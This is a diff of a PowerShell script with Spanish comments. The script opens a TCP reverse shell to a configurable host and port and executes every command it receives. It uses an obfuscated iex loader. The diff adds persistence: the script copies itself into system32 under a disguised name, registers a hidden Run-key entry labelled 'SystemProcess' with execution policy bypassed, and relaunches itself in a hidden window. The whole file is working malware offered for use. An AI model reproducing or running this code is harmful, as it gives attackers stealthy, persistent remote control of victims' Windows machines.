@@ -6,21 +6,7 @@ $rev_shell = @'
 $x=(New-Object net.sockets.tcpclient("$ip",$port)).getstream();
 [byte[]]$b=0..65535 | % {0};
 
-# Bandera para ejecutar comandos automatizados
-$executed = $false;
-
 while (($i=$x.read($b,0,$b.Length)) -ne 0) {
-    if (-not $executed) {
-        try {
-            # Crear un archivo en el escritorio
-            Add-Content -Path "$env:USERPROFILE\Desktop\prueba.txt" -Value "Este archivo fue creado automáticamente." | Out-Null
-        } catch {
-            Add-Content -Path "$env:USERPROFILE\Documents\error_log.txt" -Value "Error ejecutando comandos automatizados." | Out-Null
-        }
-        $executed = $true;
-    }
-
-    # Continuar con la interacción de la shell
     $d=([system.text.encoding]::getencoding(20127)).getbytes(
         ((iex ((New-Object -t text.asciiencoding).getstring($b,0,$i)) 2>&1 | out-string) + (pwd).path + "> ")
     );
@@ -61,8 +47,18 @@ $strings = $strings | %{AplicarOffset($_)}
 # Construir el comando final ofuscado
 $final = ' [text.encoding]::('+"'asc'+'ii'"+").('gets'+'tring')([type]."+$strings[0]+'.'+$strings[1]+'('+$strings[3]+')::'+$strings[6]+'('+$strings[7]+'))|iex'
 
-# Ejecutar el código ofuscado
-iex $final
+# COPIA DEL SCRIPT A SYSTEM32 O OTRA CARPETA OCULTA
+$destPath = "$env:windir\system32\hidden_script.ps1"
+Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $destPath -Force
+
+# CONFIGURACIÓN DE PERSISTENCIA EN EL REGISTRO
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+Set-ItemProperty -Path $regPath -Name "SystemProcess" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File $destPath"
+
+# EJECUTAR EL SCRIPT DE FORMA OCULTA
+Start-Process -WindowStyle Hidden -FilePath "powershell" -ArgumentList "-ExecutionPolicy Bypass -File `"$destPath`""
+
+Write-Output "Persistencia configurada y script ejecutándose en segundo plano."
 
 
 
